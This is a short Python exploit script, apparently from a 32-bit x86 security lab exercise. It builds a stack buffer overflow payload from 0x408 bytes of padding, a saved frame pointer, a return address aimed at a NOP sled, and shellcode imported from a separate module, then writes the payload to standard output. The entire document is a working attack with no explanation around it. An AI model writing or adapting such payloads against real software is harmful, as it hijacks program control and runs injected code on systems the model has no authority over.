from shellcode import shellcode
import sys
from struct import pack

Nop = "\x90"
ebp = 0xbffea368
Num_nop = 0x110*2
shell_start_estimate = ebp + 0x110

sys.stdout.write("x"*0x408) 
sys.stdout.write(pack("<I",ebp)) 
sys.stdout.write(pack("<I",shell_start_estimate)) #  return to shell code
sys.stdout.write(Nop*Num_nop)
sys.stdout.write(shellcode)
sys.stdout.write("\0")
